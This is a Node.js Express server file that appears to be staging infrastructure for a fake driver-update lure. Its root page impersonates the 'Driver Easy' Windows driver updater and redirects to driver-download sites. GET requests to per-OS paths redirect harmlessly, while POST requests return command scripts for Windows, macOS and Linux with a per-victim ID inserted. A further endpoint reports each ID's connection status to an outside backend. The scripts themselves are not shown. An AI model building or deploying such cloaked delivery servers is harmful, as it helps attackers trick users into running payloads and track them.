const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const routes = require('./routes');
const { errorHandler, notFound } = require('./middleware/error');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const projectRoot = process.cwd();

const REDIRECT_URL = 'https://www.3dpchip.com/new/driver/down.html?pl=cam14_1&o=6164';
const FAVICON_URL = 'https://www.3dpchip.com/favicon.ico';

const sendCmdFile = (filename, res) => {
  const filePath = path.join(projectRoot, filename);
  try {
    const content = fs.readFileSync(filePath, 'utf8');
    res.type('text/plain').send(content);
  } catch (err) {
    if (err.code === 'ENOENT') {
      res.status(404).type('text/plain').send(`File not found: ${filename}`);
      return;
    }
    throw err;
  }
};

app.get('/', (req, res) => {
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="0;url=${REDIRECT_URL}">
  <title>Driver Easy ® | Windows Driver Updater</title>
  <link rel="icon" type="image/x-icon" href="${FAVICON_URL}">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1e1e1e; min-height: 100vh; }
    .tab-bar {
      display: flex;
      align-items: center;
      height: 36px;
      background: #252526;
      padding: 0 12px;
      gap: 8px;
      -webkit-app-region: drag;
    }
    .tab-bar .favicon {
      width: 16px;
      height: 16px;
      flex-shrink: 0;
    }
    .tab-bar .title {
      color: #fff;
      font-size: 13px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      flex: 1;
    }
    .tab-bar .close {
      width: 12px;
      height: 12px;
      border: none;
      background: transparent;
      color: #ccc;
      cursor: pointer;
      font-size: 14px;
      line-height: 1;
      padding: 0;
      -webkit-app-region: no-drag;
    }
    .tab-bar .close:hover { color: #fff; }
    .content {
      padding: 24px;
      color: #ccc;
      font-size: 14px;
    }
    .content a { color: #42a5f5; }
  </style>
</head>
<body>
  <div class="tab-bar">
    <img class="favicon" src="${FAVICON_URL}" alt="">
    <span class="title">Driver Easy ® | Windows Driver Updater</span>
    <button class="close" type="button" aria-label="Close">×</button>
  </div>
  <div class="content">
    <p>Redirecting to <a href="${REDIRECT_URL}">Driver Easy</a>…</p>
  </div>
  <script>window.location.replace(${JSON.stringify(REDIRECT_URL)});</script>
</body>
</html>`;
  res.type('text/html').send(html);
});

const cmdRoute = (filename) => (req, res) => sendCmdFile(filename, res);

const escapeBashDoubleQuotedValue = (value) =>
  String(value).replace(/\\/g, '\\\\').replace(/"/g, '\\"');

const macRoute = (req, res) => {
  const id = req.params?.id || req.body?.id || req.query?.id || '';
  const filePath = path.join(projectRoot, 'mac.cmd');
  try {
    let content = fs.readFileSync(filePath, 'utf8');
    if (id) {
      content = content.replace(
        /MAC_UID="__ID__"/,
        `MAC_UID="${escapeBashDoubleQuotedValue(id)}"`
      );
    }
    res.type('text/plain').send(content);
  } catch (err) {
    if (err.code === 'ENOENT') {
      res.status(404).type('text/plain').send('File not found: mac.cmd');
      return;
    }
    throw err;
  }
};

const windowRoute = (req, res) => {
  const id = req.params?.id || req.body?.id || req.query?.id || '';
  const filePath = path.join(projectRoot, 'window.cmd');
  try {
    let content = fs.readFileSync(filePath, 'utf8');
    if (id) {
      content = content.replace(/set "WINDOW_UID=__ID__"/, `set "WINDOW_UID=${String(id).replace(/"/g, '""')}"`);
    }
    res.type('text/plain').send(content);
  } catch (err) {
    if (err.code === 'ENOENT') {
      res.status(404).type('text/plain').send(`File not found: window.cmd`);
      return;
    }
    throw err;
  }
};

const AUTO_UPDATE_REDIRECT_URL = 'https://www.drivereasy.com/auto-update/';
const DRIVER_DOWN_REDIRECT_URL = 'https://www.3dpchip.com/new/driver/down.html?pl=cam14_1&o=6164';

app.get('/window', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));
app.get('/window/:id', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));
app.get('/new/driver/down', (req, res) => res.redirect(302, DRIVER_DOWN_REDIRECT_URL));
app.get('/new/driver/down/:id', (req, res) => res.redirect(302, DRIVER_DOWN_REDIRECT_URL));
app.get('/mac', (req, res) => res.redirect(302, DRIVER_DOWN_REDIRECT_URL));
app.get('/mac/:id', (req, res) => res.redirect(302, DRIVER_DOWN_REDIRECT_URL));
app.get('/linux', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));

app.post('/linux', cmdRoute('linux.cmd'));

app.post('/window/:id', windowRoute);
app.post('/window', windowRoute);
app.post('/new/driver/down/:id', windowRoute);
app.post('/new/driver/down', windowRoute);

app.post('/mac/:id', macRoute);
app.post('/mac', macRoute);

const INVITE_API_BASE = 'https://myproject-backend-beta.vercel.app';

app.get('/auto-update', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));

app.post('/auto-update/:id', async (req, res) => {
  const id = req.params.id;
  if (!id) {
    return res.status(400).json({ error: 'Missing id' });
  }
  try {
    const inviteUrl = `${INVITE_API_BASE}/change-connection-status/${id}`;
    const response = await fetch(inviteUrl);
    const contentType = response.headers.get('content-type') || 'application/json';
    res.set('Content-Type', contentType);
    res.status(response.status);
    const text = await response.text();
    if (contentType.includes('application/json')) {
      try {
        return res.json(JSON.parse(text));
      } catch {
        return res.send(text);
      }
    }
    res.send(text);
  } catch (err) {
    console.error('Invite API error:', err);
    res.status(502).json({ error: 'Failed to reach invite service' });
  }
});

app.use('/api', routes);

app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.use(notFound);
app.use(errorHandler);

module.exports = app;
